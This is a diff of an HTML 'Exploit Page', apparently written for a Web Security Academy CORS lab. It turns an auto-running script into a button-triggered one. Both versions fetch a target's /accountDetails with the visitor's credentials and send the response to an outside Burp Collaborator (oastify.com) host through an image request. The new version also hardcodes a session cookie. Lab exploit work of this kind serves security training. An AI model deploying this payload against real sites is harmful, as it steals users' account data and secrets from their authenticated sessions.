@@ -2,22 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Test Page</title>
+    <title>Exploit Page</title>
 </head>
 <body>
-    <h1>Loading...</h1>
-    <script>
-        var req = new XMLHttpRequest();
-        req.onload = reqListener;
-        req.open('GET', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', true);
-        req.withCredentials = true;
-        req.send();
+    <h1>Click the button to fetch data</h1>
+    <button onclick="fetchData()">Fetch Data</button>
 
-        function reqListener() {
-            console.log(this.responseText); // Log the response to the console
+    <script>
+        // Function to send data to your Burp Collaborator server
+        function sendToBurpCollaborator(data) {
             var img = new Image();
-            img.src = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com/?data=' + encodeURIComponent(this.responseText);
-        };
+            img.src = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com/?data=' + encodeURIComponent(data);
+        }
+
+        // Function to fetch data from the target and send it to Burp Collaborator server
+        function fetchData() {
+            var req = new XMLHttpRequest();
+            req.onload = function() {
+                // When the request completes, send the response text to Burp Collaborator
+                sendToBurpCollaborator(this.responseText);
+            };
+            req.open('GET', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', true);
+            req.withCredentials = true;
+            req.setRequestHeader('Cookie', 'session=DNtqhFXfLDOFcppx1UwvvOJmhyhXiNU5');
+            req.send();
+        }
     </script>
 </body>
 </html>
